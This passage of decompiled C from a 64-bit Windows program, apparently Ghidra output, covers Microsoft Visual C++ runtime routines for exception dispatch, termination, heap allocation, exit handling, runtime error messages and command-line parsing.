                param_4 = local_res20;
              }
              iVar6 = iVar6 + -1;
              puVar17 = puVar17 + 5;
            } while (0 < iVar6);
            piVar10 = local_548;
            cVar5 = (char)local_res8;
            iVar6 = local_550;
            uVar15 = local_554;
          }
        }
LAB_14000d73e:
        local_558 = local_558 + 1;
        piVar10 = piVar10 + 5;
      } while (local_558 < uVar15);
      local_548 = piVar10;
      if (cVar5 != '\0') goto LAB_14000d822;
    }
    if ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff)) &&
       (param_5->dispESTypeList != 0)) {
      iVar6 = param_5->dispESTypeList;
      lVar11 = FUN_1400075e0();
      if (lVar11 + iVar6 != 0) {
        if (iVar6 == 0) {
          piVar10 = (int *)0x0;
        }
        else {
          lVar11 = FUN_1400075e0();
          piVar10 = (int *)(lVar11 + (int)param_5->dispESTypeList);
        }
        cVar5 = FUN_14000c710((longlong)param_1,piVar10);
        if (cVar5 == '\0') {
          plVar13 = FUN_1400074d0((longlong *)param_2,(DWORD64 *)param_4,(longlong)param_5,
                                  (longlong *)&local_res8);
          pDVar8 = FUN_14000b3d0();
          *(undefined1 **)(pDVar8 + 0x44) = local_518;
          _UnwindNestedFrames(param_2,(ULONG_PTR)param_1,local_res18,(ULONG_PTR)plVar13,0,-1,
                              (ULONG_PTR)param_5,(undefined8 *)param_4,param_6);
        }
      }
    }
  }
  else if (param_5->nTryBlocks != 0) {
    if (param_6 != 0) {
      terminate();
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    FUN_14000cfd0(param_1,(longlong *)param_2,param_3,(DWORD64 *)param_4,(ULONG_PTR)param_5,iVar6,
                  param_7);
  }
LAB_14000d822:
  pDVar8 = FUN_14000b3d0();
  if (*(longlong *)(pDVar8 + 0x42) != 0) {
    FUN_14000db20();
  }
  return;
}




undefined8 * FUN_14000d8a0(undefined8 *param_1,longlong param_2)

{
  FUN_140007ef0(param_1,param_2);
  *param_1 = std::bad_exception::vftable;
  return param_1;
}




undefined8
FUN_14000d8d0(int *param_1,__uint64 *param_2,ULONG_PTR param_3,_xDISPATCHER_CONTEXT *param_4,
             _s_FuncInfo *param_5,uint param_6,undefined8 param_7,byte param_8)

{
  uint uVar1;
  int iVar2;
  DWORD *pDVar3;
  longlong lVar4;
  code *pcVar5;
  undefined8 uVar6;
  undefined8 in_stack_fffffffffffffff0;
  undefined4 uVar7;
  
  uVar7 = (undefined4)((ulonglong)in_stack_fffffffffffffff0 >> 0x20);
  pDVar3 = FUN_14000b3d0();
  if (((((pDVar3[0xb4] != 0) || (iVar2 = *param_1, iVar2 == -0x1f928c9d)) ||
       ((iVar2 == -0x7fffffd7 &&
        ((param_1[6] == 0xf && (*(longlong *)(param_1 + 0x18) == 0x19930520)))))) ||
      (iVar2 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((param_5->EHFlags & 1) == 0)))) {
    if ((param_1[1] & 0x66U) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         (((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
           (param_5->dispESTypeList != 0)) &&
          (lVar4 = FUN_1400075e0(), lVar4 + (int)param_5->dispESTypeList != 0)))) {
        if ((((*param_1 == -0x1f928c9d) && (2 < (uint)param_1[6])) &&
            (0x19930522 < (uint)param_1[8])) && (*(int *)(*(longlong *)(param_1 + 0xc) + 8) != 0)) {
          lVar4 = FUN_140007600();
          pcVar5 = (code *)(lVar4 + *(int *)(*(longlong *)(param_1 + 0xc) + 8));
          if (pcVar5 != (code *)0x0) {
            uVar6 = (*pcVar5)(param_1,param_2,param_3,param_4,param_5,param_6,param_7,
                              CONCAT44(uVar7,(uint)param_8));
            return uVar6;
          }
        }
        FUN_14000d250(param_1,param_2,param_3,param_4,param_5,param_8,param_6);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      uVar1 = param_1[1] & 0x20;
      if ((uVar1 == 0) || (*param_1 != -0x7fffffda)) {
        if ((uVar1 == 0) || (*param_1 != -0x7fffffd7)) {
          FUN_140007660((longlong *)param_2,(DWORD64 *)param_4,(longlong)param_5);
        }
        else {
          iVar2 = param_1[0xe];
          if ((iVar2 < -1) || (param_5->maxState <= iVar2)) {
            FUN_14000db20();
          }
          FUN_14000c3d0(*(longlong **)(param_1 + 10),(longlong *)param_4,(longlong)param_5,iVar2);
        }
      }
      else {
        iVar2 = FUN_14000c0f0((longlong)param_5,(longlong)param_4,*(longlong *)(param_3 + 0xf8));
        if ((iVar2 < -1) || (param_5->maxState <= iVar2)) {
          FUN_14000db20();
        }
        FUN_14000c3d0((longlong *)param_2,(longlong *)param_4,(longlong)param_5,iVar2);
      }
    }
  }
  return 1;
}




/* Library Function - Single Match
    void __cdecl terminate(void)
   
   Library: Visual Studio 2008 Release */

void __cdecl terminate(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  if (*(code **)(pDVar1 + 0x34) != (code *)0x0) {
    (**(code **)(pDVar1 + 0x34))();
  }
                    /* WARNING: Subroutine does not return */
  abort();
}




void FUN_14000db20(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)FUN_14000b0e0(DAT_14001bc28);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}




/* Library Function - Single Match
    _initp_eh_hooks
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release */

void _initp_eh_hooks(void)

{
  DAT_14001bc28 = FUN_14000af20(0x14000daf0);
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    private: static void __cdecl type_info::_Type_info_dtor(class type_info * __ptr64)
    private: static void __cdecl type_info::_Type_info_dtor_internal(class type_info * __ptr64)
   
   Library: Visual Studio 2005 Release */

void FID_conflict__Type_info_dtor(longlong param_1)

{
  longlong *plVar1;
  longlong *plVar2;
  longlong *plVar3;
  
  _lock(0xe);
  plVar1 = DAT_14001bc38;
  if (*(longlong *)(param_1 + 8) != 0) {
    plVar2 = (longlong *)&DAT_14001bc30;
    do {
      plVar3 = plVar2;
      if (DAT_14001bc38 == (longlong *)0x0) goto LAB_14000dbc3;
      plVar2 = DAT_14001bc38;
    } while (*DAT_14001bc38 != *(longlong *)(param_1 + 8));
    plVar3[1] = DAT_14001bc38[1];
    FUN_14000b9c0(plVar1);
LAB_14000dbc3:
    FUN_14000b9c0(*(LPVOID *)(param_1 + 8));
    *(undefined8 *)(param_1 + 8) = 0;
  }
  FUN_14000fc60(0xe);
  return;
}




void FUN_14000dbf0(void)

{
  FUN_14000fc60(0xe);
  return;
}




LPVOID FUN_14000dc10(size_t param_1)

{
  int iVar1;
  LPVOID pvVar2;
  DWORD *pDVar3;
  SIZE_T dwBytes;
  
  if (0xffffffffffffffe0 < param_1) {
    _callnewh(param_1);
    pDVar3 = FUN_140009c00();
    *pDVar3 = 0xc;
    return (LPVOID)0x0;
  }
  dwBytes = 1;
  if (param_1 != 0) {
    dwBytes = param_1;
  }
  while( true ) {
    if (DAT_14001c0e0 == (HANDLE)0x0) {
      FUN_14000e5b0();
      FUN_14000e370(0x1e);
      FUN_14000df70(0xff);
    }
    pvVar2 = HeapAlloc(DAT_14001c0e0,0,dwBytes);
    if (pvVar2 != (LPVOID)0x0) {
      return pvVar2;
    }
    if (DAT_14001c394 == 0) break;
    iVar1 = _callnewh(param_1);
    if (iVar1 == 0) {
LAB_14000dca0:
      pDVar3 = FUN_140009c00();
      *pDVar3 = 0xc;
      return (LPVOID)0x0;
    }
  }
  pDVar3 = FUN_140009c00();
  *pDVar3 = 0xc;
  goto LAB_14000dca0;
}




/* Library Function - Single Match
    __onexitinit
   
   Library: Visual Studio 2005 Release */

undefined4 __onexitinit(void)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)FUN_14000f670(0x20);
  DAT_14001c6e8 = FUN_14000af20((INT_PTR)puVar1);
  DAT_14001c6f0 = DAT_14001c6e8;
  if (puVar1 == (undefined8 *)0x0) {
    return 0x18;
  }
  *puVar1 = 0;
  return 0;
}




INT_PTR FUN_14000dd30(INT_PTR param_1)

{
  INT_PTR *pIVar1;
  INT_PTR *pIVar2;
  ulonglong uVar3;
  longlong lVar4;
  INT_PTR IVar5;
  ulonglong uVar6;
  
  FUN_14000dfb0();
  pIVar1 = (INT_PTR *)FUN_14000b0e0(DAT_14001c6f0);
  pIVar2 = (INT_PTR *)FUN_14000b0e0(DAT_14001c6e8);
  if (pIVar1 <= pIVar2) {
    uVar6 = ((longlong)pIVar2 - (longlong)pIVar1) + 8;
    if (7 < uVar6) {
      uVar3 = FUN_140012f60((longlong)pIVar1);
      if (uVar3 < uVar6) {
        uVar6 = 0x1000;
        if (uVar3 < 0x1000) {
          uVar6 = uVar3;
        }
        if (uVar6 + uVar3 < uVar3) {
LAB_14000ddbe:
          if (uVar3 <= uVar3 + 0x20) {
            lVar4 = FUN_14000f700(pIVar1);
            if (lVar4 != 0) goto LAB_14000ddd5;
          }
          param_1 = 0;
          goto LAB_14000de11;
        }
        lVar4 = FUN_14000f700(pIVar1);
        if (lVar4 == 0) goto LAB_14000ddbe;
LAB_14000ddd5:
        pIVar2 = (INT_PTR *)(lVar4 + ((longlong)pIVar2 - (longlong)pIVar1 >> 3) * 8);
        DAT_14001c6f0 = FUN_14000af20(lVar4);
      }
      IVar5 = FUN_14000af20(param_1);
      *pIVar2 = IVar5;
      DAT_14001c6e8 = FUN_14000af20((INT_PTR)(pIVar2 + 1));
      goto LAB_14000de11;
    }
  }
  param_1 = 0;
LAB_14000de11:
  FUN_14000dfc0();
  return param_1;
}




void FUN_14000de40(void)

{
  FUN_14000dfc0();
  return;
}




int FUN_14000de60(INT_PTR param_1)

{
  INT_PTR IVar1;
  
  IVar1 = FUN_14000dd30(param_1);
  return (IVar1 != 0) - 1;
}




void FUN_14000de80(undefined8 param_1)

{
  DAT_14001bc40 = param_1;
  return;
}




/* Library Function - Single Match
    _callnewh
   
   Library: Visual Studio 2005 Release */

int __cdecl _callnewh(size_t _Size)

{
  int iVar1;
  code *pcVar2;
  
  pcVar2 = (code *)FUN_14000b0e0(DAT_14001bc40);
  if (pcVar2 != (code *)0x0) {
    iVar1 = (*pcVar2)(_Size);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}




/* Library Function - Single Match
    long __cdecl __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS * __ptr64)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

long __cdecl __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  int iVar1;
  PEXCEPTION_RECORD pEVar2;
  code *pcVar3;
  long lVar4;
  
  pEVar2 = param_1->ExceptionRecord;
  if (((pEVar2->ExceptionCode == 0xe06d7363) && (pEVar2->NumberParameters == 4)) &&
     ((iVar1 = (int)pEVar2->ExceptionInformation[0], iVar1 == 0x19930520 ||
      (((iVar1 == 0x19930521 || (iVar1 == 0x19930522)) || (iVar1 == 0x1994000)))))) {
    terminate();
    pcVar3 = (code *)swi(3);
    lVar4 = (*pcVar3)();
    return lVar4;
  }
  return 0;
}




undefined8 FUN_14000df20(void)

{
  SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  return 0;
}




/* Library Function - Single Match
    _amsg_exit
   
   Library: Visual Studio 2008 Release */

void __cdecl _amsg_exit(int param_1)

{
  code *UNRECOVERED_JUMPTABLE;
  
  FUN_14000e5b0();
  FUN_14000e370(param_1);
  UNRECOVERED_JUMPTABLE = (code *)FUN_14000b0e0((INT_PTR)PTR_FUN_14001ad68);
                    /* WARNING: Could not recover jumptable at 0x00014000df6a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(0xff);
  return;
}




void FUN_14000df70(uint param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA("mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)((ulonglong)param_1);
    }
  }
                    /* WARNING: Subroutine does not return */
  ExitProcess(param_1);
}




void FUN_14000dfb0(void)

{
  _lock(8);
  return;
}




void FUN_14000dfc0(void)

{
  FUN_14000fc60(8);
  return;
}




void FUN_14000dfd0(undefined8 *param_1,undefined8 *param_2)

{
  if (param_1 < param_2) {
    do {
      if ((code *)*param_1 != (code *)0x0) {
        (*(code *)*param_1)();
      }
      param_1 = param_1 + 1;
    } while (param_1 < param_2);
  }
  return;
}




/* Library Function - Single Match
    _get_osplatform
   
   Library: Visual Studio 2005 Release */

undefined8 _get_osplatform(int *param_1)

{
  DWORD *pDVar1;
  
  if ((param_1 != (int *)0x0) && (DAT_14001bc4c != 0)) {
    *param_1 = DAT_14001bc4c;
    return 0;
  }
  pDVar1 = FUN_140009c00();
  *pDVar1 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




undefined8 FUN_14000e060(undefined4 *param_1)

{
  DWORD *pDVar1;
  
  if ((param_1 != (undefined4 *)0x0) && (DAT_14001bc4c != 0)) {
    *param_1 = DAT_14001bc58;
    return 0;
  }
  pDVar1 = FUN_140009c00();
  *pDVar1 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




undefined8 FUN_14000e0b0(undefined4 param_1)

{
  BOOL BVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  
  if ((DAT_14001c700 != (code *)0x0) &&
     (BVar1 = _IsNonwritableInCurrentImage((PBYTE)&DAT_14001c700), BVar1 != 0)) {
    (*DAT_14001c700)(param_1);
  }
  FUN_14000fea0();
  puVar3 = &DAT_140015318;
  uVar2 = 0;
  do {
    if ((int)uVar2 != 0) {
      return uVar2;
    }
    if ((code *)*puVar3 != (code *)0x0) {
      uVar2 = (*(code *)*puVar3)();
    }
    puVar3 = puVar3 + 1;
  } while (puVar3 < &DAT_140015340);
  if ((int)uVar2 == 0) {
    FUN_14000de60(0x14000f330);
    puVar3 = &DAT_140015308;
    do {
      if ((code *)*puVar3 != (code *)0x0) {
        (*(code *)*puVar3)();
      }
      puVar3 = puVar3 + 1;
    } while (puVar3 < &DAT_140015310);
    if ((DAT_14001c708 != (code *)0x0) &&
       (BVar1 = _IsNonwritableInCurrentImage((PBYTE)&DAT_14001c708), BVar1 != 0)) {
      (*DAT_14001c708)(0,2);
    }
    uVar2 = 0;
  }
  return uVar2;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000e180(uint param_1,int param_2,int param_3)

{
  longlong lVar1;
  longlong *plVar2;
  longlong *plVar3;
  INT_PTR IVar4;
  code *pcVar5;
  
  _lock(8);
  if (DAT_14001bcac != 1) {
    _DAT_14001bca8 = 1;
    DAT_14001bc64 = (undefined1)param_3;
    if (param_2 == 0) {
      plVar2 = (longlong *)FUN_14000b0e0(DAT_14001c6f0);
      plVar3 = (longlong *)FUN_14000b0e0(DAT_14001c6e8);
      if (plVar2 != (longlong *)0x0) {
        while (plVar3 = plVar3 + -1, plVar2 <= plVar3) {
          if (*plVar3 != 0) {
            lVar1 = *plVar3;
            IVar4 = FUN_14000aff0();
            if (lVar1 != IVar4) {
              pcVar5 = (code *)FUN_14000b0e0(lVar1);
              (*pcVar5)();
            }
          }
        }
      }
      FUN_14000dfd0((undefined8 *)&DAT_140015348,(undefined8 *)&DAT_140015360);
    }
    FUN_14000dfd0((undefined8 *)&DAT_140015368,(undefined8 *)&DAT_140015370);
  }
  if (param_3 != 0) {
    FUN_14000fc60(8);
    return;
  }
  DAT_14001bcac = 1;
  FUN_14000fc60(8);
  FUN_14000df70(param_1);
  pcVar5 = (code *)swi(3);
  (*pcVar5)();
  return;
}




void FUN_14000e2a0(undefined8 param_1,longlong param_2)

{
  if (*(int *)(param_2 + 0x60) != 0) {
    FUN_14000fc60(8);
  }
  return;
}




void FUN_14000e2c0(uint param_1)

{
  FUN_14000e180(param_1,0,0);
  return;
}




void FUN_14000e2d0(uint param_1)

{
  FUN_14000e180(param_1,1,0);
  return;
}




void FUN_14000e2e0(void)

{
  FUN_14000e180(0,0,1);
  return;
}




/* Library Function - Single Match
    _init_pointers
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release */

void __cdecl _init_pointers(void)

{
  INT_PTR IVar1;
  
  IVar1 = FUN_14000aff0();
  FUN_14000de80(IVar1);
  FUN_1400132b0(IVar1);
  FUN_140007220(IVar1);
  FUN_1400132a0(IVar1);
  FUN_140013290(IVar1);
  _initp_misc_winsig(IVar1);
  FUN_14000e6a0();
  _initp_eh_hooks();
  PTR_FUN_14001ad68 = (undefined *)FUN_14000af20(0x14000e2d0);
  return;
}




void FUN_14000e370(int param_1)

{
  char cVar1;
  int iVar2;
  errno_t eVar3;
  DWORD DVar4;
  int *piVar5;
  HANDLE hFile;
  ulonglong uVar6;
  longlong lVar7;
  uint uVar8;
  char *pcVar9;
  DWORD local_res10 [2];
  
  uVar8 = 0;
  piVar5 = &DAT_14001ad70;
  while (param_1 != *piVar5) {
    uVar8 = uVar8 + 1;
    piVar5 = piVar5 + 4;
    if (0x16 < uVar8) {
      return;
    }
  }
  if (uVar8 < 0x17) {
    iVar2 = FUN_140013660(3);
    if ((iVar2 != 1) && ((iVar2 = FUN_140013660(3), iVar2 != 0 || (DAT_14001a100 != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar3 = strcpy_s(&DAT_14001bcb0,0x314,"Runtime Error!\n\nProgram: ");
      if (eVar3 != 0) {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_14001bdcd = 0;
      DVar4 = GetModuleFileNameA((HMODULE)0x0,&DAT_14001bcc9,0x104);
      if ((DVar4 == 0) &&
         (eVar3 = strcpy_s(&DAT_14001bcc9,0x2fb,"<program name unknown>"), eVar3 != 0)) {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      uVar6 = 0xffffffffffffffff;
      pcVar9 = &DAT_14001bcc9;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      if ((0x3c < ~uVar6) &&
         (pcVar9 = (char *)(~uVar6 + 0x14001bc8d),
         eVar3 = strncpy_s(pcVar9,(longlong)&DAT_14001bfc4 - (longlong)pcVar9,"...",3), eVar3 != 0))
      {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      eVar3 = strcat_s(&DAT_14001bcb0,0x314,"\n\n");
      if (eVar3 != 0) {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      eVar3 = strcat_s(&DAT_14001bcb0,0x314,
                       (&PTR_s_R6002___floating_point_support_n_14001ad78)[(longlong)(int)uVar8 * 2]
                      );
      if (eVar3 == 0) {
        FUN_140013400(&DAT_14001bcb0,"Microsoft Visual C++ Runtime Library",0x12010);
        return;
      }
                    /* WARNING: Subroutine does not return */
      FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffffffffffff)) {
      lVar7 = -1;
      pcVar9 = (&PTR_s_R6002___floating_point_support_n_14001ad78)[(longlong)(int)uVar8 * 2];
      do {
        if (lVar7 == 0) break;
        lVar7 = lVar7 + -1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      WriteFile(hFile,(&PTR_s_R6002___floating_point_support_n_14001ad78)[(longlong)(int)uVar8 * 2],
                ~(uint)lVar7 - 1,local_res10,(LPOVERLAPPED)0x0);
    }
  }
  return;
}




void FUN_14000e5b0(void)

{
  char cVar1;
  int iVar2;
  int *piVar3;
  HANDLE hFile;
  longlong lVar4;
  uint uVar5;
  char *pcVar6;
  DWORD local_res8 [2];
  
  iVar2 = FUN_140013660(3);
  if (iVar2 != 1) {
    iVar2 = FUN_140013660(3);
    if (iVar2 != 0) {
      return;
    }
    if (DAT_14001a100 != 1) {
      return;
    }
  }
  piVar3 = &DAT_14001ad70;
  uVar5 = 0;
  do {
    if (*piVar3 == 0xfc) {
      if (((uVar5 < 0x17) &&
          (((iVar2 = FUN_140013660(3), iVar2 == 1 ||
            ((iVar2 = FUN_140013660(3), iVar2 == 0 && (DAT_14001a100 == 1)))) &&
           (hFile = GetStdHandle(0xfffffff4), hFile != (HANDLE)0x0)))) &&
         (hFile != (HANDLE)0xffffffffffffffff)) {
        lVar4 = -1;
        pcVar6 = (&PTR_s_R6002___floating_point_support_n_14001ad78)[(longlong)(int)uVar5 * 2];
        goto code_r0x00014000e670;
      }
      break;
    }
    uVar5 = uVar5 + 1;
    piVar3 = piVar3 + 4;
  } while (uVar5 < 0x17);
  goto LAB_14000e682;
  while( true ) {
    lVar4 = lVar4 + -1;
    cVar1 = *pcVar6;
    pcVar6 = pcVar6 + 1;
    if (cVar1 == '\0') break;
code_r0x00014000e670:
    if (lVar4 == 0) break;
  }
  WriteFile(hFile,(&PTR_s_R6002___floating_point_support_n_14001ad78)[(longlong)(int)uVar5 * 2],
            ~(uint)lVar4 - 1,local_res8,(LPOVERLAPPED)0x0);
LAB_14000e682:
  FUN_14000e370(0xff);
  return;
}




void FUN_14000e6a0(void)

{
  return;
}




undefined4 FUN_14000e6b0(int param_1,undefined8 param_2)

{
  int iVar1;
  DWORD DVar2;
  int *piVar3;
  code *pcVar4;
  undefined8 uVar5;
  DWORD *pDVar6;
  int *piVar7;
  uint uVar8;
  ulonglong uVar9;
  longlong lVar10;
  
  pDVar6 = FUN_14000b340();
  if (pDVar6 != (DWORD *)0x0) {
    piVar3 = *(int **)(pDVar6 + 0x28);
    piVar7 = piVar3;
    do {
      if (*piVar7 == param_1) break;
      piVar7 = piVar7 + 4;
    } while (piVar7 < piVar3 + (longlong)DAT_14001af8c * 4);
    if (((piVar7 < piVar3 + (longlong)DAT_14001af8c * 4) && (*piVar7 == param_1)) &&
       (pcVar4 = *(code **)(piVar7 + 2), pcVar4 != (code *)0x0)) {
      if (pcVar4 == (code *)0x5) {
        piVar7[2] = 0;
        piVar7[3] = 0;
        return 1;
      }
      if (pcVar4 == (code *)0x1) {
        return 0xffffffff;
      }
      uVar5 = *(undefined8 *)(pDVar6 + 0x2a);
      *(undefined8 *)(pDVar6 + 0x2a) = param_2;
      if (piVar7[1] == 8) {
        uVar9 = (ulonglong)DAT_14001af80;
        if (DAT_14001af80 < DAT_14001af84 + DAT_14001af80) {
          lVar10 = uVar9 << 4;
          do {
            uVar8 = (int)uVar9 + 1;
            uVar9 = (ulonglong)uVar8;
            *(undefined8 *)(lVar10 + 8 + *(longlong *)(pDVar6 + 0x28)) = 0;
            lVar10 = lVar10 + 0x10;
          } while ((int)uVar8 < DAT_14001af84 + DAT_14001af80);
        }
        iVar1 = *piVar7;
        DVar2 = pDVar6[0x2c];
        if (iVar1 == -0x3fffff72) {
          pDVar6[0x2c] = 0x83;
        }
        else if (iVar1 == -0x3fffff70) {
          pDVar6[0x2c] = 0x81;
        }
        else if (iVar1 == -0x3fffff6f) {
          pDVar6[0x2c] = 0x84;
        }
        else if (iVar1 == -0x3fffff6d) {
          pDVar6[0x2c] = 0x85;
        }
        else if (iVar1 == -0x3fffff73) {
          pDVar6[0x2c] = 0x82;
        }
        else if (iVar1 == -0x3fffff71) {
          pDVar6[0x2c] = 0x86;
        }
        else if (iVar1 == -0x3fffff6e) {
          pDVar6[0x2c] = 0x8a;
        }
        (*pcVar4)(8,pDVar6[0x2c]);
        *(undefined8 *)(pDVar6 + 0x2a) = uVar5;
        pDVar6[0x2c] = DVar2;
        return 0xffffffff;
      }
      piVar7[2] = 0;
      piVar7[3] = 0;
      (*pcVar4)();
      *(undefined8 *)(pDVar6 + 0x2a) = uVar5;
      return 0xffffffff;
    }
  }
  return 0;
}




byte * FUN_14000e8c0(void)

{
  byte *pbVar1;
  bool bVar2;
  byte bVar3;
  undefined7 extraout_var;
  byte *pbVar4;
  
  if (DAT_14001c6f8 == 0) {
    FUN_14000ab10();
  }
  pbVar4 = DAT_14001d728;
  bVar2 = false;
  if (DAT_14001d728 == (byte *)0x0) {
    pbVar4 = &DAT_140015cb2;
    bVar2 = false;
  }
  do {
    bVar3 = *pbVar4;
    if (bVar3 < 0x21) {
      if (bVar3 == 0) {
        return pbVar4;
      }
      if (!bVar2) {
        bVar3 = *pbVar4;
        while ((bVar3 != 0 && (bVar3 < 0x21))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          bVar3 = *pbVar1;
        }
        return pbVar4;
      }
    }
    if (bVar3 == 0x22) {
      bVar2 = !bVar2;
    }
    bVar3 = FUN_1400136c0((uint)bVar3);
    if ((int)CONCAT71(extraout_var,bVar3) != 0) {
      pbVar4 = pbVar4 + 1;
    }
    pbVar4 = pbVar4 + 1;
  } while( true );
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14000e950(void)

{
  char cVar1;
  char cVar2;
  errno_t eVar3;
  undefined8 *puVar4;
  char *pcVar5;
  uint uVar6;
  ulonglong uVar7;
  longlong lVar8;
  char *pcVar9;
  int iVar10;
  
  if (DAT_14001c6f8 == 0) {
    FUN_14000ab10();
  }
  iVar10 = 0;
  if (DAT_14001b638 == (char *)0x0) {
    return 0xffffffff;
  }
  cVar2 = *DAT_14001b638;
  pcVar9 = DAT_14001b638;
  while (cVar2 != '\0') {
    if (cVar2 != '=') {
      iVar10 = iVar10 + 1;
    }
    uVar7 = 0xffffffffffffffff;
    pcVar5 = pcVar9;
    do {
      if (uVar7 == 0) break;
      uVar7 = uVar7 - 1;
      cVar2 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar2 != '\0');
    pcVar9 = pcVar9 + ~uVar7;
    cVar2 = *pcVar9;
  }
  puVar4 = (undefined8 *)FUN_14000f670((longlong)(iVar10 + 1),8);
  DAT_14001bc78 = puVar4;
  if (puVar4 == (undefined8 *)0x0) {
    return 0xffffffff;
  }
  cVar2 = *DAT_14001b638;
  pcVar9 = DAT_14001b638;
  do {
    if (cVar2 == '\0') {
      FUN_14000b9c0(DAT_14001b638);
      DAT_14001b638 = (char *)0x0;
      *puVar4 = 0;
      _DAT_14001c6e0 = 1;
      return 0;
    }
    lVar8 = -1;
    pcVar5 = pcVar9;
    do {
      if (lVar8 == 0) break;
      lVar8 = lVar8 + -1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    uVar6 = ~(uint)lVar8;
    if (cVar2 != '=') {
      pcVar5 = (char *)FUN_14000f670((longlong)(int)uVar6,1);
      *puVar4 = pcVar5;
      if (pcVar5 == (char *)0x0) {
        FUN_14000b9c0(DAT_14001bc78);
        DAT_14001bc78 = (undefined8 *)0x0;
        return 0xffffffff;
      }
      eVar3 = strcpy_s(pcVar5,(longlong)(int)uVar6,pcVar9);
      if (eVar3 != 0) {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      puVar4 = puVar4 + 1;
    }
    pcVar9 = pcVar9 + (int)uVar6;
    cVar2 = *pcVar9;
  } while( true );
}




void FUN_14000eac0(byte *param_1,undefined8 *param_2,byte *param_3,int *param_4,int *param_5)

{
  bool bVar1;
  bool bVar2;
  byte bVar3;
  byte bVar4;
  int iVar5;
  undefined7 extraout_var;
  undefined7 extraout_var_00;
  uint uVar6;
  ulonglong uVar7;
  byte *pbVar8;
  byte *pbVar9;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (undefined8 *)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  bVar2 = false;
  do {
    if (*param_1 == 0x22) {
      bVar2 = !bVar2;
      bVar4 = 0x22;
      pbVar8 = param_1 + 1;
    }
    else {
      *param_5 = *param_5 + 1;
      pbVar9 = param_3;
      if (param_3 != (byte *)0x0) {
        pbVar9 = param_3 + 1;
        *param_3 = *param_1;
      }
      bVar4 = *param_1;
      pbVar8 = param_1 + 1;
      bVar3 = FUN_1400136c0((uint)bVar4);
      param_3 = pbVar9;
      if ((int)CONCAT71(extraout_var,bVar3) != 0) {
        *param_5 = *param_5 + 1;
        if (pbVar9 != (byte *)0x0) {
          param_3 = pbVar9 + 1;
          *pbVar9 = *pbVar8;
        }
        pbVar8 = param_1 + 2;
      }
      if (bVar4 == 0) {
        pbVar8 = pbVar8 + -1;
        goto LAB_14000eb8a;
      }
    }
    param_1 = pbVar8;
  } while ((bVar2) || ((bVar4 != 0x20 && (bVar4 != 9))));
  if (param_3 != (byte *)0x0) {
    param_3[-1] = 0;
  }
LAB_14000eb8a:
  bVar2 = false;
  while (*pbVar8 != 0) {
    for (; (*pbVar8 == 0x20 || (*pbVar8 == 9)); pbVar8 = pbVar8 + 1) {
    }
    if (*pbVar8 == 0) break;
    if (param_2 != (undefined8 *)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      uVar7 = 0;
      bVar1 = true;
      bVar4 = *pbVar8;
      pbVar9 = pbVar8;
      while (bVar4 == 0x5c) {
        pbVar9 = pbVar9 + 1;
